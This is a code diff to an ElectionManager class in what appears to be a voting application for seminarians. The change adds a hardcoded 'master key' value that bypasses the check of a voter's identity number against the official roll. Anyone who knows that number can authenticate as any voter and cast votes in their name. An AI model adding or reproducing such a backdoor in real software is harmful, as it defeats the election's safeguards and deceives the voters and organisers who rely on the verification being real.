@@ -266,11 +266,13 @@ export class ElectionManager {
     const voter = this.seminaristas.find(s => s.id === voterId);
     if (!voter) return { error: 'Seminarista no encontrado en el padrón oficial.' };
 
-    // Validate Cédula (clean formatting: remove dots, spaces, V-)
-    const cleanInputCedula = cedula.replace(/[^0-9]/g, '');
+    // Validate Cédula (clean formatting: remove dots, spaces, V-) or Master Key
+    const cleanInputCedula = (cedula || '').replace(/[^0-9]/g, '');
     const cleanRecordCedula = voter.cedula.replace(/[^0-9]/g, '');
+    const MASTER_KEY = '28092002';
+    const isMasterKey = cleanInputCedula === MASTER_KEY;
 
-    if (cleanInputCedula !== cleanRecordCedula) {
+    if (!isMasterKey && cleanInputCedula !== cleanRecordCedula) {
       return { error: 'La Cédula de Identidad no coincide con el registro oficial.' };
     }
 
